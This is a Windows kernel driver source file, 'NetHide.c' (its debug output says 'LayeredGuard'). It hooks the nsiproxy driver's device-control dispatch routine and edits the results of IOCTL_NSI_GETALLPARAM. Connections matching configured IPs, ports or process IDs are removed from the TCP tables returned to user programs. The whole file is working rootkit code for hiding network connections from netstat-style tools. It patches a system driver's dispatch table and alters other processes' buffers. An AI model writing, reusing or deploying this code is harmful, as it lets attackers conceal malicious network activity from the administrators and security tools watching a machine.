/* SPDX-License-Identifier: GPL-2.0 */
/*
 * NetHide.c - hook \Driver\nsiproxy's IRP_MJ_DEVICE_CONTROL and filter
 * IOCTL_NSI_GETALLPARAM TCP tables in the IRP completion routine.
 *
 * Filtering works on x64 native, x86 native and WoW64 (spec §0.1): the
 * 0x3C parameter block drives both x86 flavors. Counting rule: the
 * outstanding count increments ONLY after a completion routine is
 * successfully installed, and EVERY completion exit path decrements.
 */
#include "NetHide.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, NetHide_Init)
#pragma alloc_text(PAGE, NetHide_Cleanup)
#pragma alloc_text(PAGE, NetHide_ResetRules)
#endif

/* Completion routines and the DeviceControl hook run above PASSIVE:
 * never paged. */

#define NHPOOL_TAG 'NtHd'

#define IOCTL_NSI_GETALLPARAM  0x12001BUL

/* TCP sub-entry 28 bytes; Port/dwIP are both network byte order */
typedef struct {
    CHAR  _pad0[2];
    USHORT Port;
    ULONG dwIP;
    CHAR  _pad1[20];
} NH_TCP_SUBENTRY;

typedef struct {
    NH_TCP_SUBENTRY localEntry;
    NH_TCP_SUBENTRY remoteEntry;
} NH_TCP_TABLE_ENTRY;                     /* 0x38 */

typedef struct {
    ULONG dwState;
    CHAR  _pad[8];
} NH_STATUS_ENTRY;

typedef struct {
    ULONG dwUdpProId; ULONG _u2; ULONG _u3;
    ULONG dwProcessId;                     /* ByPid filter dimension */
    ULONG _u5; ULONG _u6; ULONG _u7; ULONG _u8;
} NH_PROCESSID_INFO;

/* x64 NSI parameter block, 0x70 bytes */
typedef struct {
    ULONG_PTR _Unk1; SIZE_T _Unk2; PVOID _Unk3; SIZE_T _Unk4;
    ULONG _Unk5; ULONG _Unk6;
    PVOID   TcpEntries;                     /* -> NH_TCP_TABLE_ENTRY[] */
    SIZE_T  EntrySize;                      /* expected 0x38 */
    PVOID   _Unk9; SIZE_T _Unk10;
    PVOID   StatusEntries;                  /* -> NH_STATUS_ENTRY[] */
    SIZE_T  _Unk12;
    PVOID   ProcessIdInfo;                  /* -> NH_PROCESSID_INFO[] */
    SIZE_T  _Unk14;
    SIZE_T  ConnCount;                      /* writable: update after filter */
} NH_NSI_PARAM_X64;

#ifdef _WIN64
/* WoW64 parameter block 0x3C: POINTER_32 truncated user-mode pointers */
typedef struct {
    DWORD _Unk1, _Unk2, _Unk3, _Unk4, _Unk5, _Unk6;
    VOID * POINTER_32 lpMem;
    DWORD EntrySize;
    DWORD _Unk9, _Unk10;
    NH_STATUS_ENTRY * POINTER_32 lpStatus;
    DWORD _Unk12;
    VOID * POINTER_32 ProcessIdInfo;        /* 32-bit user pointer */
    DWORD _Unk14;
    DWORD TcpConnCount;
} NH_NSI_PARAM_X86;
#else
/* x86 native: same 0x3C layout with native pointers (no POINTER_32) */
typedef struct {
    DWORD _Unk1, _Unk2, _Unk3, _Unk4, _Unk5, _Unk6;
    PVOID lpMem;
    DWORD EntrySize;
    DWORD _Unk9, _Unk10;
    PVOID lpStatus;
    DWORD _Unk12;
    PVOID ProcessIdInfo;
    DWORD _Unk14;
    DWORD TcpConnCount;
} NH_NSI_PARAM_X86;
#endif

typedef struct {
    PIO_COMPLETION_ROUTINE OriginalCompletionRoutine;
    PVOID                  OriginalContext;
    BOOLEAN                InvokeOnSuccess;
    PEPROCESS              RequestingProcess;
    BOOLEAN                IsX64Block;      /* 0x70 param vs 0x3C param */
} NH_HOOKED_IO_COMPLETION;

typedef struct _NH_RULE_NODE {
    LIST_ENTRY Link;
    NET_HIDE_FILTER_RULE Rule;
} NH_RULE_NODE;

/* ------------------------------------------------------------------ */
/* Globals                                                             */
/* ------------------------------------------------------------------ */
static volatile LONG  g_OutstandingIrp = 0;
static PDRIVER_DISPATCH g_OriginalDeviceControl = NULL;
static PDRIVER_OBJECT   g_NsiproxyDriver = NULL;

static LIST_ENTRY    g_RuleListHead;
static KSPIN_LOCK    g_RuleLock;

/* ------------------------------------------------------------------ */
/* Rule list                                                           */
/* ------------------------------------------------------------------ */
static NTSTATUS
NhAddRule (__in NET_HIDE_FILTER_TYPE Type, __in ULONG Value)
{
    KIRQL oldIrql;
    NH_RULE_NODE *node;

    node = (NH_RULE_NODE *)ExAllocatePoolWithTag(NonPagedPool,
                                                 sizeof(NH_RULE_NODE),
                                                 NHPOOL_TAG);
    if (!node)
        return STATUS_INSUFFICIENT_RESOURCES;
    RtlZeroMemory(node, sizeof(NH_RULE_NODE));
    node->Rule.Type = Type;
    node->Rule.LocalIp = Value;             /* union: raw value store */

    KeAcquireSpinLock(&g_RuleLock, &oldIrql);
    InsertTailList(&g_RuleListHead, &node->Link);
    KeReleaseSpinLock(&g_RuleLock, oldIrql);
    return STATUS_SUCCESS;
}

NTSTATUS
NetHide_AddByLocalIp (__in ULONG LocalIp)
{
    return NhAddRule(NetHideFilterByLocalIp, LocalIp);
}

NTSTATUS
NetHide_AddByLocalPort (__in USHORT LocalPort)
{
    return NhAddRule(NetHideFilterByLocalPort, (ULONG)LocalPort);
}

NTSTATUS
NetHide_AddByRemoteIp (__in ULONG RemoteIp)
{
    return NhAddRule(NetHideFilterByRemoteIp, RemoteIp);
}

NTSTATUS
NetHide_AddByPid (__in ULONG Pid)
{
    return NhAddRule(NetHideFilterByPid, Pid);
}

/* Unlink everything under the lock, free outside the lock (spec §7.4). */
VOID
NetHide_ResetRules (VOID)
{
    KIRQL oldIrql;
    LIST_ENTRY drain;
    PLIST_ENTRY link;

    PAGED_CODE();

    InitializeListHead(&drain);

    KeAcquireSpinLock(&g_RuleLock, &oldIrql);
    while (!IsListEmpty(&g_RuleListHead)) {
        link = RemoveHeadList(&g_RuleListHead);
        InsertTailList(&drain, link);
    }
    KeReleaseSpinLock(&g_RuleLock, oldIrql);

    while (!IsListEmpty(&drain)) {
        link = RemoveHeadList(&drain);
        ExFreePoolWithTag(CONTAINING_RECORD(link, NH_RULE_NODE, Link),
                          NHPOOL_TAG);
    }
}

static BOOLEAN
NhRuleHits (__in PNH_TCP_TABLE_ENTRY Entry,
            __in_opt PNH_PROCESSID_INFO PidTable,
            __in ULONG Index,
            __in ULONG PidCount)
{
    KIRQL oldIrql;
    PLIST_ENTRY link;
    USHORT localHost;    /* NSI Port is network order, rules are host order */
    USHORT remoteHost;
    BOOLEAN hit = FALSE;

    localHost = RtlUshortByteSwap(Entry->localEntry.Port);
    remoteHost = RtlUshortByteSwap(Entry->remoteEntry.Port);

    KeAcquireSpinLock(&g_RuleLock, &oldIrql);
    for (link = g_RuleListHead.Flink; link != &g_RuleListHead;
         link = link->Flink) {
        NH_RULE_NODE *node = CONTAINING_RECORD(link, NH_RULE_NODE, Link);

        switch (node->Rule.Type) {
        case NetHideFilterByLocalPort:
            if (localHost == node->Rule.LocalPort)
                hit = TRUE;
            break;
        case NetHideFilterByRemoteIp:
            if (Entry->remoteEntry.dwIP == node->Rule.RemoteIp)
                hit = TRUE;
            break;
        case NetHideFilterByLocalIp:
            if (Entry->localEntry.dwIP == node->Rule.LocalIp)
                hit = TRUE;
            break;
        case NetHideFilterByPid:
            /* no pid dimension without the pid table */
            if (PidTable && Index < PidCount &&
                PidTable[Index].dwProcessId == node->Rule.Pid)
                hit = TRUE;
            break;
        }
        if (hit)
            break;
    }
    KeReleaseSpinLock(&g_RuleLock, oldIrql);
    return hit;
}

/* ------------------------------------------------------------------ */
/* Table filtering                                                     */
/* ------------------------------------------------------------------ */
static VOID
NhCompactTable (__in PVOID Table, __in ULONG EntrySize, __in ULONG Index,
                __in ULONG Count)
{
    /* shift everything after Index one entry left */
    RtlMoveMemory((PUCHAR)Table + Index * EntrySize,
                  (PUCHAR)Table + (Index + 1) * EntrySize,
                  (Count - Index - 1) * EntrySize);
}

/* One hidden entry at Index is removed from all three tables in step. */
static VOID
NhFilterTables (__in PVOID TcpEntries, __in ULONG TcpEntrySize,
                __in_opt PVOID StatusEntries,
                __in_opt PVOID ProcessIdInfo,
                __inout PULONG pCount)
{
    ULONG count = *pCount;
    ULONG i = 0;

    if (TcpEntrySize != sizeof(NH_TCP_TABLE_ENTRY))
        return;

    while (i < count) {
        PNH_TCP_TABLE_ENTRY entry =
            (PNH_TCP_TABLE_ENTRY)((PUCHAR)TcpEntries + i * TcpEntrySize);

        if (NhRuleHits(entry, (PNH_PROCESSID_INFO)ProcessIdInfo, i, count)) {
            NhCompactTable(TcpEntries, TcpEntrySize, i, count);
            if (StatusEntries)
                NhCompactTable(StatusEntries, sizeof(NH_STATUS_ENTRY), i,
                               count);
            if (ProcessIdInfo)
                NhCompactTable(ProcessIdInfo, sizeof(NH_PROCESSID_INFO), i,
                               count);
            count--;
            continue;                       /* re-examine the shifted entry */
        }
        i++;
    }

    *pCount = count;
}

static VOID
NhFilterIrpUserBuffer (__in PIRP Irp, __in PEPROCESS Requester,
                       __in BOOLEAN IsX64Block)
{
    KAPC_STATE apcState;
    PVOID userBuffer;

    /* MUST attach before reading UserBuffer (requester-mode pointers). */
    KeStackAttachProcess(Requester, &apcState);

    __try {
        userBuffer = Irp->UserBuffer;
        if (!userBuffer || !MmIsAddressValid(userBuffer))
            __leave;

#ifdef _WIN64
        if (IsX64Block) {
            NH_NSI_PARAM_X64 *param = (NH_NSI_PARAM_X64 *)userBuffer;

            if (param->TcpEntries && MmIsAddressValid(param->TcpEntries) &&
                param->EntrySize == sizeof(NH_TCP_TABLE_ENTRY)) {
                ULONG count = (ULONG)param->ConnCount;

                NhFilterTables(param->TcpEntries,
                               (ULONG)param->EntrySize,
                               (param->StatusEntries &&
                                MmIsAddressValid(param->StatusEntries))
                                   ? param->StatusEntries : NULL,
                               (param->ProcessIdInfo &&
                                MmIsAddressValid(param->ProcessIdInfo))
                                   ? param->ProcessIdInfo : NULL,
                               &count);
                param->ConnCount = count;
            }
        } else
#endif
        {
            /* x86 native / WoW64 0x3C block: shared completion path
             * (spec §0.1). Zero-extend the 32-bit user pointers. */
            NH_NSI_PARAM_X86 *param = (NH_NSI_PARAM_X86 *)userBuffer;
            PVOID tcp = (PVOID)(ULONG_PTR)param->lpMem;
            PVOID status = (PVOID)(ULONG_PTR)param->lpStatus;
            PVOID pidInfo = (PVOID)(ULONG_PTR)param->ProcessIdInfo;

            if (tcp && MmIsAddressValid(tcp) &&
                param->EntrySize == sizeof(NH_TCP_TABLE_ENTRY)) {
                ULONG count = param->TcpConnCount;

                NhFilterTables(tcp, param->EntrySize,
                               (status && MmIsAddressValid(status))
                                   ? status : NULL,
                               (pidInfo && MmIsAddressValid(pidInfo))
                                   ? pidInfo : NULL,
                               &count);
                param->TcpConnCount = count;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        /* swallow: filtering is best effort, never break the IRP */
    }

    KeUnstackDetachProcess(&apcState);
}

/* ------------------------------------------------------------------ */
/* Completion routines                                                 */
/* ------------------------------------------------------------------ */
static NTSTATUS
NhCompletionX64 (__in PDEVICE_OBJECT DeviceObject, __in PIRP Irp,
                 __in PVOID Context)
{
    PNH_HOOKED_IO_COMPLETION ctx = (PNH_HOOKED_IO_COMPLETION)Context;
    PIO_COMPLETION_ROUTINE origRoutine = ctx->OriginalCompletionRoutine;
    PVOID origContext = ctx->OriginalContext;
    BOOLEAN invokeOnSuccess = ctx->InvokeOnSuccess;
    PEPROCESS requester = ctx->RequestingProcess;
    PIO_STACK_LOCATION next;
    NTSTATUS status;

    UNREFERENCED_PARAMETER(DeviceObject);

    __try {
        if (NT_SUCCESS(Irp->IoStatus.Status))
            NhFilterIrpUserBuffer(Irp, requester, ctx->IsX64Block);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        /* swallow and continue teardown */
    }

    /* Install wrote the CURRENT stack location; restore goes through the
     * NEXT one - swapping them corrupts the completion chain. */
    next = IoGetNextIrpStackLocation(Irp);
    next->CompletionRoutine = origRoutine;
    next->Context = origContext;

    ExFreePoolWithTag(ctx, NHPOOL_TAG);

    if (invokeOnSuccess && origRoutine) {
        status = origRoutine(DeviceObject, Irp, origContext);
    } else {
        if (Irp->PendingReturned)
            IoMarkIrpPending(Irp);
        status = STATUS_SUCCESS;
    }

    if (requester)
        ObDereferenceObject(requester);    /* every exit path incl. SEH */

    InterlockedDecrement(&g_OutstandingIrp);
    return status;
}

static NTSTATUS
NhCompletionX86 (__in PDEVICE_OBJECT DeviceObject, __in PIRP Irp,
                 __in PVOID Context)
{
    /* The 0x3C parameter block layout is shared by x86 native and WoW64
     * (struct definitions differ only in pointer representation), so the
     * body is identical to the x64 one. */
    return NhCompletionX64(DeviceObject, Irp, Context);
}

/* ------------------------------------------------------------------ */
/* DeviceControl hook                                                  */
/* ------------------------------------------------------------------ */
static NTSTATUS
NhDeviceControlHook (__in PDEVICE_OBJECT DeviceObject, __in PIRP Irp)
{
    PIO_STACK_LOCATION sl = IoGetCurrentIrpStackLocation(Irp);
    PIO_COMPLETION_ROUTINE newCompletion = NULL;
    PNH_HOOKED_IO_COMPLETION ctx;
    ULONG inputLength;

    if (!sl)
        return g_OriginalDeviceControl(DeviceObject, Irp);

    if (sl->Parameters.DeviceIoControl.IoControlCode != IOCTL_NSI_GETALLPARAM)
        return g_OriginalDeviceControl(DeviceObject, Irp);

    inputLength = sl->Parameters.DeviceIoControl.InputBufferLength;
#ifdef _WIN64
    if (inputLength == sizeof(NH_NSI_PARAM_X64))
        newCompletion = NhCompletionX64;
    else if (inputLength == sizeof(NH_NSI_PARAM_X86))
        newCompletion = NhCompletionX86;
#else
    /* x86 native: the 0x3C block drives filtering too - never a stub. */
    if (inputLength == sizeof(NH_NSI_PARAM_X86))
        newCompletion = NhCompletionX86;
#endif
    if (!newCompletion)
        return g_OriginalDeviceControl(DeviceObject, Irp);

    ctx = (PNH_HOOKED_IO_COMPLETION)ExAllocatePoolWithTag(
              NonPagedPool, sizeof(NH_HOOKED_IO_COMPLETION), NHPOOL_TAG);
    if (!ctx)
        return g_OriginalDeviceControl(DeviceObject, Irp);

    ctx->OriginalCompletionRoutine = sl->CompletionRoutine;
    ctx->OriginalContext = sl->Context;
    ctx->InvokeOnSuccess = (sl->Control & SL_INVOKE_ON_SUCCESS) != 0;

    ctx->IsX64Block = (newCompletion == NhCompletionX64);
    ctx->RequestingProcess = PsGetCurrentProcess();
    ObReferenceObject(ctx->RequestingProcess);

    sl->CompletionRoutine = newCompletion;
    sl->Context = ctx;
    sl->Control |= SL_INVOKE_ON_SUCCESS;

    /* Count only after the routine is actually on the IRP. */
    InterlockedIncrement(&g_OutstandingIrp);

    return g_OriginalDeviceControl(DeviceObject, Irp);
}

/* ------------------------------------------------------------------ */
/* Init / cleanup                                                      */
/* ------------------------------------------------------------------ */
NTSTATUS
NetHide_Init (VOID)
{
    UNICODE_STRING name;
    NTSTATUS status;

    PAGED_CODE();

    InitializeListHead(&g_RuleListHead);
    KeInitializeSpinLock(&g_RuleLock);
    InterlockedExchange(&g_OutstandingIrp, 0);

    RtlInitUnicodeString(&name, L"\\Driver\\nsiproxy");
    status = ObReferenceObjectByName(&name, OBJ_CASE_INSENSITIVE, NULL, 0,
                                     *IoDriverObjectType, KernelMode, NULL,
                                     (PVOID *)&g_NsiproxyDriver);
    if (!NT_SUCCESS(status)) {
        KdPrint(("LayeredGuard: nsiproxy not found 0x%08X\n", status));
        g_NsiproxyDriver = NULL;
        return status;
    }

    g_OriginalDeviceControl = (PDRIVER_DISPATCH)
        g_NsiproxyDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL];
    InterlockedExchangePointer(
        (PVOID volatile *)&g_NsiproxyDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL],
        (PVOID)NhDeviceControlHook);

    KdPrint(("LayeredGuard: nsiproxy hooked\n"));
    return STATUS_SUCCESS;
}

VOID
NetHide_Cleanup (VOID)
{
    LARGE_INTEGER delay;
    LONGLONG waitedMs = 0;

    PAGED_CODE();

    if (!g_NsiproxyDriver)
        return;

    /* Restore DeviceControl FIRST, then drain in-flight completions. */
    if (g_OriginalDeviceControl) {
        InterlockedExchangePointer(
            (PVOID volatile *)&g_NsiproxyDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL],
            (PVOID)g_OriginalDeviceControl);
        g_OriginalDeviceControl = NULL;
    }

    delay.QuadPart = -50 * 10000LL;        /* 50 ms */
    while (g_OutstandingIrp != 0 && waitedMs < 3000) {
        KeDelayExecutionThread(KernelMode, FALSE, &delay);
        waitedMs += 50;
    }

    NetHide_ResetRules();

    ObDereferenceObject(g_NsiproxyDriver);
    g_NsiproxyDriver = NULL;
}
